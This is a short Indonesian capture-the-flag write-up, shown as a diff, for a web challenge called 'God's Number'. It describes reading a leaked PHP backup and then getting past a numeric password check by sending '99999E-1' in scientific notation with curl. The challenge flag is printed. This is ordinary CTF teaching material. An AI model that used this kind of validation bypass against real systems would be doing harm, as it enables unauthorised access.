@@ -1,0 +1,27 @@
+God's Number (100pts)
+
+God's Number ? O'really ?
+
+URL: http://103.200.7.150:8087/
+
+Setelah dilakukan pengamatan, ditemukan sebuah robots.txt berisi script backup dari proses.php
+
+ada sebuah kondisi pengecekan dimana.
+
+panjang >4 , >5000, <10000
+
+Kami pernah mendapatkan soal seperti ini sebelumnya. Maka kami menabahkan Konstanta E di inputan kami.
+
+Sehingga. 99999E Tetapi masih salah.
+root@darkrose$ curl -X GET URL: http://103.200.7.150:8087/proses.php?password=99999E
+{"status":"Password harus berupa angka!","notice":"error"}
+
+kami berfikir jika panjang >5 , kami mencoba menggunakan e<0, kami mencoba angka 99999E-1
+
+Kami menambahkan -1 pada akhiran.
+
+root@darkrose$ curl -X GET URL: http://103.200.7.150:8087/proses.php?password=99999E-1
+
+{"status":"SlashRootCTF{4phun_bypass!}","notice":"success"}
+
+SlashRootCTF{4phun_bypass!}
